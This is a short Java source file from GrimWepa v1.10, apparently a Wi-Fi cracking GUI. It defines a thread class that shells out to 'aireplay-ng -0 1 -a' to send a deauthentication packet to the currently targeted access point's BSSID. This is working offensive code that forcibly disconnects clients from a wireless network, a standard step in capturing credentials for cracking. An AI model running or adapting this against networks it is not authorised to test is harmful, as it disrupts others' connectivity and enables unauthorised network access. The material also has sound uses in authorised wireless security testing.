/** sends a deauthentication packet via aireplay-ng 
	to the current targeted access point
*/

public class threadDeauth implements Runnable {
	/** deauth thread*/
	Thread t;
	
	/** contructor, creates new thread*/
	public threadDeauth() {
		t = new Thread(this, "threadDeauth");
	}
	
	/** sends 1 deauthentication request to the current BSSID, pauses 1/2 second*/
	public void run() {
		String oldStat = Gui.lblStatus.getText();
		
		Methods.stat("sending 1 deauthentication request...");
		
		Methods.readExec("aireplay-ng -0 1 -a " + Methods.currentBSSID + " " + (String)Gui.cboDrivers.getSelectedItem());
		
		Methods.stat("1 deauth sent");
		Methods.pause(0.5);
		Gui.lblStatus.setText(oldStat);
	}
}

/** GrimWepa v1.10
	Copyright (C) 2010 Derv Merkler
*/
